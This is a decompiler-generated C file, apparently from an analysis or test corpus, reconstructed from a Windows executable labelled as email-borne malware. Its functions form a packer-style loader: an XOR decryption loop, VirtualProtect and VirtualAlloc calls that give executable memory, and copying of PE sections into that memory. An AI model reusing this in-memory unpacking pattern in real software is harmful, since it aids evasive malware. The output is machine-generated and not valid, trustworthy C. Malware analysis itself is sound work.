// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1131/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401010()
{
	fn004011F0(fp - 0x00000020);
	word32 eax_21 = (0x00459010 - (dwLoc20 << 0x0000000F) & 0xFFFF0000) + (dwLoc20 + 0xFFFFFFF6 << 0x0000000D);
	uint32 ecx_23 = dwLoc20 << 0x0000000F >>u 0x00000002;
	(fp - 0x0000001F)[dwLoc20] = (eax_21 + 0xFFFEA074)[ecx_23];
	Eq_34 ecx_34 = -(ecx_23 >>u 0x00000001) + (eax_21 + 0x0000B088);
	VirtualProtect(ecx_34, dwLoc14, 0x00000004, fp - 0x00000008);
	fn00401190(ecx_34, dwLoc14, dwLoc20);
	Eq_58 * ebx_64 = ecx_34.u0[dwLoc20] + ecx_34;
	word32 dwLoc1C_109 = (word32) ebx_64->b0006;
	Eq_69 * eax_77 = VirtualAlloc(ebx_64->t0034, ebx_64->t0050, 0x00003000, 0x00000040);
	fn004011D0((&ebx_64->dw005F)[dwLoc20], ecx_34, eax_77);
	Eq_95 * esi_106 = &ebx_64->t00F8;
	do
	{
		fn004011D0(esi_106->dw0010, ecx_34 + Mem29[esi_106 + 0x00000014:word32], eax_77 + Mem29[esi_106 + 0x0000000C:word32]);
		word32 v13_108 = dwLoc1C_109 - 0x00000001;
		esi_106 = esi_106 + 1;
		dwLoc1C_109 = v13_108;
	} while (v13_108 != 0x00000000);
	(&fp->dw000B)[dwLoc20] = (&ebx_64->dw001D)[dwLoc20] + eax_77;
	fn004011D0(0x00000038, dwLoc20 + 0x0040114A, fp - 0x00000058);
	fn00401190(fp - 0x00000058, 0x00000038, dwLoc20);
	Eq_69 * eax_144 = eax_77;
	do
		eax_144 = eax_144 + 1;
	while (eax_144->dw0000 != dwLoc20 - 0x5544332E);
	fp->dw000B = fp - 0x00000063 + dwLoc20;
	fn004011D0(0x00000043 - dwLoc20, 0x00000038, eax_144);
	return;
}

void fn00401190(Eq_34 dwArg04, Eq_44 dwArg08, word32 dwArg0C)
{
	word32 * ebx_26 = dwArg04;
	int32 ecx_10 = dwArg08;
	word32 eax_16 = dwArg0C + 0x0EE2C9C7;
	int32 dwLoc08_22 = 0x00000001;
	*ebx_26 = *ebx_26 ^ eax_16;
	ecx_10 = ecx_10 - 0x00000004;
	while (ecx_10 > 0x00000000)
	{
		eax_16 = eax_16 + 0x1C576312 + dwLoc08_22;
		ebx_26 = PTRADD(ebx_26,15) - dwArg0C;
		dwLoc08_22 = -fp->dwFFFFFFF8;
		*ebx_26 = *ebx_26 ^ eax_16;
		ecx_10 = ecx_10 - 0x00000004;
	}
	return;
}

void fn004011D0(word32 dwArg04, Eq_34 dwArg08, Eq_69 * dwArg0C)
{
	Eq_191 * edi_13 = dwArg0C;
	Eq_193 * esi_15 = dwArg08;
	word32 ecx_17 = dwArg04;
	do
	{
		edi_13->b0000 = esi_15->b0000;
		esi_15 = esi_15 + 1;
		edi_13 = edi_13 + 1;
		ecx_17 = ecx_17 - 0x00000001;
	} while (ecx_17 != 0x00000000);
	return;
}

void fn004011F0(word32 dwArg04)
{
	Mem0[0x7FFE0300:word32]();
	*dwArg04 = 0x0000000F;
	return;
}

